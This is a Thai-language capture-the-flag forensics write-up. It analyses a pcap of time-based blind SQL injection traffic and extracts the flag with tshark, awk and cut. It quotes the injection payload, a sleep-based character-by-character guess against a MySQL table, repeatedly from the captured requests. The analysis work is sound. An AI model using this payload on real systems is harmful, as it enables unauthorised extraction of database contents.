ได้ไฟล์ pcap มา

![[Pasted image 20260715144913.png]]

เช็ค http

![[Pasted image 20260715144958.png]]

จะเห็น value
test",(select sleep(IF(ascii(substr((select flag from flag),1,1))= 34,5,0)));--
มันเป็นการ เดารหัสไปเรื่อย
ถ้าอันนี้คือ เดาตำแหน่งที่ 1 รหัส ascii 34 ถ้าถูกมันจะรอ 5 วิถ้าไม่ถูกก็เดาต่อเลย
ลอง run tshark ออกมา
```bash
tshark -r "chall.pcap" -Y "http" -T fields -e http.request_in -e http.time -e urlencoded-form.value | tail
```
```
		test",(select sleep(IF(ascii(substr((select flag from flag),48,1))= 122,5,0)));--,aaa
41089	0.084405000	
		test",(select sleep(IF(ascii(substr((select flag from flag),48,1))= 123,5,0)));--,aaa
41098	0.075073000	
		test",(select sleep(IF(ascii(substr((select flag from flag),48,1))= 124,5,0)));--,aaa
41107	0.117533000	
		test",(select sleep(IF(ascii(substr((select flag from flag),48,1))= 125,5,0)));--,aaa
41116	5.138000000	
		test",(select sleep(IF(ascii(substr((select flag from flag),48,1))= 126,5,0)));--,aaa
41125	0.106672000
```

ได้แบบนี้แสดงว่าแค่ต้องหา ascii ทุกตัวที่ติด http.time > 5 เอามาต่อกันก็จะได้ flag
ผมเลยตัดเอาค่าที่มากกว่า 5 วิออกมาก่อน

```bash
tshark -r "chall.pcap" -Y "http" -T fields -E separator="|" -e http.request_in -e http.time -e urlencoded-form.value | awk -F"|" ' $3 != "" {lq = $3} $2 >= 5{print lq "|" $1 "|" $2} '
```

คั่นทุกอย่างด้วย | เราต้องการข้อมูลบก่อนขึ้น 5 วิ เราก็จะเก็บข้อมูลไว้ใน lq คือเก็บเมื่อมีค่า ($3 != "") พอ http.time มากกว่า 5 วิก็ print ออกมา ($2 >= 5{print lq "|" $1 "|" $2}) คั่นด้วย "|"

```
test",(select sleep(IF(ascii(substr((select flag from flag),1,1))= 111,5,0)));--,aaa|715|5.102500000
test",(select sleep(IF(ascii(substr((select flag from flag),2,1))= 118,5,0)));--,aaa|1633|5.115889000
test",(select sleep(IF(ascii(substr((select flag from flag),3,1))= 98,5,0)));--,aaa|2308|5.076324000
test",(select sleep(IF(ascii(substr((select flag from flag),4,1))= 123,5,0)));--,aaa|3388|5.145849000
test",(select sleep(IF(ascii(substr((select flag from flag),5,1))= 104,5,0)));--,aaa|4072|5.092175000
test",(select sleep(IF(ascii(substr((select flag from flag),6,1))= 116,5,0)));--,aaa|5035|5.113700000
test",(select sleep(IF(ascii(substr((select flag from flag),7,1))= 116,5,0)));--,aaa|5890|5.080604000
test",(select sleep(IF(ascii(substr((select flag from flag),8,1))= 112,5,0)));--,aaa|6718|5.147195000
test",(select sleep(IF(ascii(substr((select flag from flag),9,1))= 115,5,0)));--,aaa|7600|5.136516000
test",(select sleep(IF(ascii(substr((select flag from flag),10,1))= 58,5,0)));--,aaa|7942|5.108773000
test",(select sleep(IF(ascii(substr((select flag from flag),11,1))= 47,5,0)));--,aaa|8707|5.086912000
test",(select sleep(IF(ascii(substr((select flag from flag),12,1))= 47,5,0)));--,aaa|9562|5.079662000
test",(select sleep(IF(ascii(substr((select flag from flag),13,1))= 119,5,0)));--,aaa|11065|5.073186000
test",(select sleep(IF(ascii(substr((select flag from flag),14,1))= 119,5,0)));--,aaa|11920|5.092876000
test",(select sleep(IF(ascii(substr((select flag from flag),15,1))= 119,5,0)));--,aaa|12775|5.118838000
test",(select sleep(IF(ascii(substr((select flag from flag),16,1))= 46,5,0)));--,aaa|12973|5.095269000
test",(select sleep(IF(ascii(substr((select flag from flag),17,1))= 121,5,0)));--,aaa|14512|5.148977000
test",(select sleep(IF(ascii(substr((select flag from flag),18,1))= 111,5,0)));--,aaa|15277|5.089954000
test",(select sleep(IF(ascii(substr((select flag from flag),19,1))= 117,5,0)));--,aaa|16186|5.117698000
test",(select sleep(IF(ascii(substr((select flag from flag),20,1))= 116,5,0)));--,aaa|17032|5.140319000
test",(select sleep(IF(ascii(substr((select flag from flag),21,1))= 117,5,0)));--,aaa|17905|5.086328000
test",(select sleep(IF(ascii(substr((select flag from flag),22,1))= 98,5,0)));--,aaa|18589|5.102700000
test",(select sleep(IF(ascii(substr((select flag from flag),23,1))= 101,5,0)));--,aaa|19480|5.076054000
test",(select sleep(IF(ascii(substr((select flag from flag),24,1))= 46,5,0)));--,aaa|19840|5.080978000
test",(select sleep(IF(ascii(substr((select flag from flag),25,1))= 99,5,0)));--,aaa|21172|5.140855000
test",(select sleep(IF(ascii(substr((select flag from flag),26,1))= 111,5,0)));--,aaa|22135|5.124789000
test",(select sleep(IF(ascii(substr((select flag from flag),27,1))= 109,5,0)));--,aaa|22972|5.123724000
test",(select sleep(IF(ascii(substr((select flag from flag),28,1))= 47,5,0)));--,aaa|23269|5.107918000
test",(select sleep(IF(ascii(substr((select flag from flag),29,1))= 119,5,0)));--,aaa|24772|5.066961000
test",(select sleep(IF(ascii(substr((select flag from flag),30,1))= 97,5,0)));--,aaa|25429|5.090308000
test",(select sleep(IF(ascii(substr((select flag from flag),31,1))= 116,5,0)));--,aaa|26455|5.062067000
test",(select sleep(IF(ascii(substr((select flag from flag),32,1))= 99,5,0)));--,aaa|27157|5.141755000
test",(select sleep(IF(ascii(substr((select flag from flag),33,1))= 104,5,0)));--,aaa|28057|5.074159000
test",(select sleep(IF(ascii(substr((select flag from flag),34,1))= 63,5,0)));--,aaa|28543|5.079145000
test",(select sleep(IF(ascii(substr((select flag from flag),35,1))= 118,5,0)));--,aaa|29893|5.108072000
test",(select sleep(IF(ascii(substr((select flag from flag),36,1))= 61,5,0)));--,aaa|30235|5.059039000
test",(select sleep(IF(ascii(substr((select flag from flag),37,1))= 50,5,0)));--,aaa|31009|5.147162000
test",(select sleep(IF(ascii(substr((select flag from flag),38,1))= 114,5,0)));--,aaa|32440|5.085727000
test",(select sleep(IF(ascii(substr((select flag from flag),39,1))= 103,5,0)));--,aaa|33196|5.083720000
test",(select sleep(IF(ascii(substr((select flag from flag),40,1))= 80,5,0)));--,aaa|33844|5.082854000
test",(select sleep(IF(ascii(substr((select flag from flag),41,1))= 119,5,0)));--,aaa|35050|5.060537000
test",(select sleep(IF(ascii(substr((select flag from flag),42,1))= 56,5,0)));--,aaa|35338|5.062583000
test",(select sleep(IF(ascii(substr((select flag from flag),43,1))= 103,5,0)));--,aaa|36625|5.072999000
test",(select sleep(IF(ascii(substr((select flag from flag),44,1))= 69,5,0)));--,aaa|37174|5.070754000
test",(select sleep(IF(ascii(substr((select flag from flag),45,1))= 85,5,0)));--,aaa|38173|5.120457000
test",(select sleep(IF(ascii(substr((select flag from flag),46,1))= 104,5,0)));--,aaa|39208|5.117655000
test",(select sleep(IF(ascii(substr((select flag from flag),47,1))= 85,5,0)));--,aaa|39892|5.141545000
test",(select sleep(IF(ascii(substr((select flag from flag),48,1))= 125,5,0)));--,aaa|41116|5.138000000
```

ต่อมาก็ตัดให้เหลือ ascii ที่เราต้องการ

```bash
tshark -r "chall.pcap" -Y "http" -T fields -E separator="|" -e http.request_in -e http.time -e urlencoded-form.value | awk -F"|" ' $3 != "" {lq = $3} $2 >= 5{print lq "|" $1 "|" $2} ' | cut -d" " -f6

```

cut ตามช่องว่างให้เหลือส่วนที่ต้องการคือก่อน ascii แล้วค่อยตัดตาม , อีกที

```
111,5,0)));--,aaa|715|5.102500000
118,5,0)));--,aaa|1633|5.115889000
98,5,0)));--,aaa|2308|5.076324000
123,5,0)));--,aaa|3388|5.145849000
104,5,0)));--,aaa|4072|5.092175000
116,5,0)));--,aaa|5035|5.113700000
116,5,0)));--,aaa|5890|5.080604000
112,5,0)));--,aaa|6718|5.147195000
115,5,0)));--,aaa|7600|5.136516000
58,5,0)));--,aaa|7942|5.108773000
47,5,0)));--,aaa|8707|5.086912000
47,5,0)));--,aaa|9562|5.079662000
119,5,0)));--,aaa|11065|5.073186000
119,5,0)));--,aaa|11920|5.092876000
119,5,0)));--,aaa|12775|5.118838000
46,5,0)));--,aaa|12973|5.095269000
121,5,0)));--,aaa|14512|5.148977000
111,5,0)));--,aaa|15277|5.089954000
117,5,0)));--,aaa|16186|5.117698000
116,5,0)));--,aaa|17032|5.140319000
117,5,0)));--,aaa|17905|5.086328000
98,5,0)));--,aaa|18589|5.102700000
101,5,0)));--,aaa|19480|5.076054000
46,5,0)));--,aaa|19840|5.080978000
99,5,0)));--,aaa|21172|5.140855000
111,5,0)));--,aaa|22135|5.124789000
109,5,0)));--,aaa|22972|5.123724000
47,5,0)));--,aaa|23269|5.107918000
119,5,0)));--,aaa|24772|5.066961000
97,5,0)));--,aaa|25429|5.090308000
116,5,0)));--,aaa|26455|5.062067000
99,5,0)));--,aaa|27157|5.141755000
104,5,0)));--,aaa|28057|5.074159000
63,5,0)));--,aaa|28543|5.079145000
118,5,0)));--,aaa|29893|5.108072000
61,5,0)));--,aaa|30235|5.059039000
50,5,0)));--,aaa|31009|5.147162000
114,5,0)));--,aaa|32440|5.085727000
103,5,0)));--,aaa|33196|5.083720000
80,5,0)));--,aaa|33844|5.082854000
119,5,0)));--,aaa|35050|5.060537000
56,5,0)));--,aaa|35338|5.062583000
103,5,0)));--,aaa|36625|5.072999000
69,5,0)));--,aaa|37174|5.070754000
85,5,0)));--,aaa|38173|5.120457000
104,5,0)));--,aaa|39208|5.117655000
85,5,0)));--,aaa|39892|5.141545000
125,5,0)));--,aaa|41116|5.138000000
```

ตัดให้เหลือ ascii

```bash
tshark -r "chall.pcap" -Y "http" -T fields -E separator="|" -e http.request_in -e http.time -e urlencoded-form.value | awk -F"|" ' $3 != "" {lq = $3} $2 >= 5{print lq "|" $1 "|" $2} ' | cut -d" " -f6 | cut -d"," -f1 | tr "\n" " "
```

ตัด , แล้วเอาตัวแรก และแทนที่ ขึ้นบรรทัดใหม่ด้วย space bar

```
111 118 98 123 104 116 116 112 115 58 47 47 119 119 119 46 121 111 117 116 117 98 101 46 99 111 109 47 119 97 116 99 104 63 118 61 50 114 103 80 119 56 103 69 85 104 85 125
```

![[Pasted image 20260715150137.png]]

decode ได้ flag

```
ovb{https://www.youtube.com/watch?v=2rgPw8gEUhU}
```